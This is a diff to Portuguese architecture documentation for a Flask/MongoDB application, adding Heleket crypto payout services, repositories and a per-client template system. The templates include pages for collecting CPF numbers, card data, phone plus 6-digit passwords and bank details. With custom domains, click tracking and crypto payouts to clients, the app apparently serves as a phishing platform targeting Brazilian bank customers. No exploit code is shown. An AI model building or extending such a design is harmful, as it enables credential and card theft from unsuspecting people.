@@ -31,13 +31,14 @@ Responsável pela interação com o banco de dados MongoDB e lógica de dados.
 
 - `user.py` - Classe base User
 - `admin.py` - Modelo Admin (herda de User)
-- `client.py` - Modelo Client (herda de User)
+- `client.py` - Modelo Client (herda de User) - inclui métodos para preferências de carteira cripto
 - `plan.py` - Modelo de planos de assinatura
 - `template.py` - Modelo de templates personalizados
 - `domain.py` - Modelo de domínios
 - `info.py` - Modelo de informações bancárias
 - `login_log.py` - Modelo de logs de login
 - `click.py` - Modelo de rastreamento de cliques
+- `client_crypto_payout.py` - Modelo de payouts em criptomoedas (Heleket)
 
 **Características:**
 
@@ -120,17 +121,19 @@ valid, error = ClientService.validate_client_data(
 client = ClientService.get_client_with_details(client_id)
 ```
 
-#### AuditService
+#### AuditService (Legado)
 
 - Registro de operações sensíveis
 - Rastreabilidade de ações
 - Logs de auditoria
 
+⚠️ **Nota:** Preferir `audit_helper` para novas implementações.
+
 ```python
 from app.services.audit_service import AuditService
 
 # Registrar ação de admin
-AuditService.log_admin_action('create', admin_id, {'username': os.getenv('ADMIN_USERNAME', 'admin_user')})
+AuditService.log_admin_action('create', admin_id, {'username': 'admin_user'})
 
 # Obter logs recentes
 logs = AuditService.get_recent_logs(limit=50, entity_type='admin')
@@ -166,6 +169,74 @@ log_deletion(
     entity_id=domain_id,
     payload={"name": domain_name}
 )
+```
+
+#### HeleketClient
+
+Cliente completo da API Heleket para integração de pagamentos em criptomoedas.
+
+**Funcionalidades:**
+
+- Criação de payouts em cripto (USDT, BTC, etc.)
+- Gestão de idempotência com `external_id`
+- Consulta de status de transações
+- Cancelamento de payouts pendentes
+- Tratamento de erros e retry automático
+
+```python
+from app.services.heleket_client import HeleketClient
+
+client = HeleketClient()
+
+# Criar payout
+response = client.create_payout(
+    external_id="payout-123",
+    wallet_address="TRX...",
+    asset="USDT",
+    network="TRC20",
+    amount=100.00
+)
+
+# Consultar status
+status = client.get_payout_status(payout_id="heleket-id-456")
+
+# Cancelar payout
+result = client.cancel_payout(payout_id="heleket-id-456")
+```
+
+#### PayoutOrchestrationService
+
+Orquestração do fluxo completo de payouts, integrando formulário administrativo com a API Heleket.
+
+```python
+from app.services.payout_orchestration_service import PayoutOrchestrationService
+
+# Iniciar payout via dashboard
+service = PayoutOrchestrationService()
+result = service.initiate_payout(
+    client_id="client-123",
+    wallet_address="TRX...",
+    asset="USDT",
+    network="TRC20",
+    amount=100.00,
+    initiated_by_id="admin-456"
+)
+```
+
+#### PayoutReconciliationService
+
+Serviço de reconciliação automática para atualizar status de payouts via polling da API Heleket.
+
+```python
+from app.services.payout_reconciliation_service import PayoutReconciliationService
+
+service = PayoutReconciliationService()
+
+# Reconciliar payouts pendentes (comando CLI)
+updated_count = service.schedule_pending()
+
+# Verificar status agora
+service.check_now(payout_id="payout-123")
 ```
 
 ### 3. Schemas (`app/schemas/`)
@@ -218,8 +289,11 @@ Processamento de requisições HTTP e orquestração entre services/models.
 - `template.py` - Gestão de templates
 - `domain.py` - Gestão de domínios
 - `info.py` - Gestão de informações bancárias
-- `main.py` - Rotas principais (index, dashboard)
-- ~~`public_template.py` - Renderização pública de templates~~ *(removido)*
+- `dashboard.py` - Dashboards e KPIs (admin, client, enterprise)
+- `payout.py` - Payouts Heleket (webhooks e reconciliação)
+- `public_template.py` - Renderização pública de templates customizados
+- `main.py` - Rotas principais (index, health-checks)
+- `crud_mixin.py` - Mixin CRUD reutilizável para padronização
 
 **Responsabilidades:**
 
@@ -370,7 +444,57 @@ templates/
     └── submit_success.html
 ```
 
-### 7. Utils (`app/utils/`)
+### 7. Repositories (`app/repositories/`)
+
+Camada de acesso a dados que abstrai operações do MongoDB.
+
+**Características:**
+
+- Abstração das queries MongoDB
+- Padrão Repository para desacoplar persistência
+- Queries otimizadas e reutilizáveis
+- Suporte a operações CRUD padronizadas
+
+```python
+from app.repositories.base import ModelCrudRepository
+from app.models.plan import Plan
+
+# Usar repository
+repo = ModelCrudRepository(Plan)
+all_plans = repo.list_all()
+plan = repo.get_by_id(plan_id)
+```
+
+### 8. Paginas (`app/paginas/`)
+
+Sistema de templates Jinja2 para páginas customizadas por cliente.
+
+**Templates Disponíveis:**
+
+- `base.html` - Template base para páginas customizadas
+- `page_cpf.html` - Página de coleta de CPF
+- `page_cartao.html` - Página de coleta de dados de cartão
+- `page_celular_senha6.html` - Página de coleta de celular e senha 6 dígitos
+- `page_dados_bancarios.html` - Página de coleta de dados bancários
+- `page_sucesso.html` - Página de sucesso após submissão
+
+**Características:**
+
+- Totalmente customizável via Jinja2
+- Redução de 95% no código (1280 → 62 linhas)
+- Modular e reutilizável
+- Suporta routing via slugs únicos
+
+```python
+# Exemplo de uso no controller
+from app.template_loader import load_template
+
+# Carregar template customizado
+template = load_template("page_cpf")
+return render_template(template, client_data=data)
+```
+
+### 9. Utils (`app/utils/`)
 
 Utilitários e helpers da aplicação.
 
@@ -379,14 +503,14 @@ Utilitários e helpers da aplicação.
 - `user_loader.py` - Flask-Login user loader
 - `validators.py` - Validadores customizados
 
-### 8. Scripts (`scripts/`)
+### 10. Scripts (`scripts/`)
 
 Scripts utilitários para administração do sistema.
 
 **Scripts Disponíveis:**
 
 - `create_superadmin.py` - Criar super admin manualmente via CLI
-- `setup.py` - Setup automatizado do projeto (instala dependências, configura ambiente)
+- `deploy_to_ec2.py` - Script de deploy para AWS EC2
 
 ## Fluxo de uma Requisição
 
@@ -784,6 +908,112 @@ def test_login_invalid_credentials(client):
 - Lógica de negócio complexa
 - Validações de formulários
 - Processamento de requisições
+
+## Integrações Externas
+
+### Heleket Payment Gateway
+
+O sistema integra-se com a API Heleket para processamento de payouts em criptomoedas.
+
+**Arquitetura da Integração:**
+
+```text
+┌─────────────────┐
+│ Admin Dashboard │
+│  (Payout Form)  │
+└────────┬────────┘
+         │
+         ▼
+┌──────────────────────────────┐
+│ PayoutOrchestrationService   │
+│ - Validar dados              │
+│ - Preparar payload           │
+└────────┬─────────────────────┘
+         │
+         ▼
+┌──────────────────────────────┐
+│     HeleketClient            │
+│ - create_payout()            │
+│ - get_payout_status()        │
+│ - cancel_payout()            │
+└────────┬─────────────────────┘
+         │
+         ▼
+┌──────────────────────────────┐
+│      API Heleket             │
+│  (External Service)          │
+└────────┬─────────────────────┘
+         │
+         ▼ (Webhook callback)
+┌──────────────────────────────┐
+│  POST /payouts/webhook       │
+│  - HMAC validation           │
+│  - Status update             │
+│  - Audit logging             │
+└──────────────────────────────┘
+```
+
+**Componentes Principais:**
+
+1. **HeleketClient** (`app/services/heleket_client.py`)
+   - Cliente HTTP para API Heleket
+   - Gestão de idempotência
+   - Retry automático
+   - Tratamento de erros
+
+2. **PayoutOrchestrationService** (`app/services/payout_orchestration_service.py`)
+   - Orquestração do fluxo completo
+   - Validação de negócio
+   - Criação de registros locais
+   - Chamadas à API
+
+3. **PayoutReconciliationService** (`app/services/payout_reconciliation_service.py`)
+   - Polling periódico de status
+   - Reconciliação automática
+   - Comando CLI: `flask reconcile-payouts`
+
+4. **Payout Controller** (`app/controllers/payout.py`)
+   - Endpoint de webhook: `POST /payouts/webhook`
+   - Endpoint de reconciliação: `POST /payouts/reconcile`
+   - Validação HMAC de segurança
+
+5. **ClientCryptoPayout Model** (`app/models/client_crypto_payout.py`)
+   - Persistência de payouts
+   - Histórico de status
+   - Métodos de agregação para KPIs
+
+**Configuração:**
+
+```bash
+# .env ou variáveis de ambiente
+HELEKET_PROJECT_URL=https://api.heleket.com
+HELEKET_MERCHANT_ID=your-merchant-id
+HELEKET_API_KEY=your-api-key
+HELEKET_WEBHOOK_SECRET=shared-secret-for-hmac
+```
+
+**Fluxo de Payout:**
+
+1. Admin inicia payout via dashboard
+2. `PayoutOrchestrationService` cria registro local com `external_id`
+3. `HeleketClient` envia requisição à API Heleket
+4. Sistema recebe `heleket_payout_id` e atualiza registro
+5. Heleket envia callback via webhook (ou polling verifica status)
+6. Sistema atualiza status e registra auditoria
+7. Dashboard exibe KPIs e histórico atualizado
+
+**Segurança:**
+
+- Validação HMAC em webhooks via `HELEKET_WEBHOOK_SECRET`
+- Auditoria completa de todas operações
+- Gestão de idempotência para evitar duplicatas
+- Credenciais em variáveis de ambiente
+
+**Documentação Adicional:**
+
+- [HELEKET_README.md](./HELEKET_README.md) - Documentação completa
+- [HELEKET_CLIENT.md](./HELEKET_CLIENT.md) - Cliente da API
+- [HELEKET_DATA_MAPPING.md](./HELEKET_DATA_MAPPING.md) - Mapeamento de dados
 
 ## Extensibilidade
 
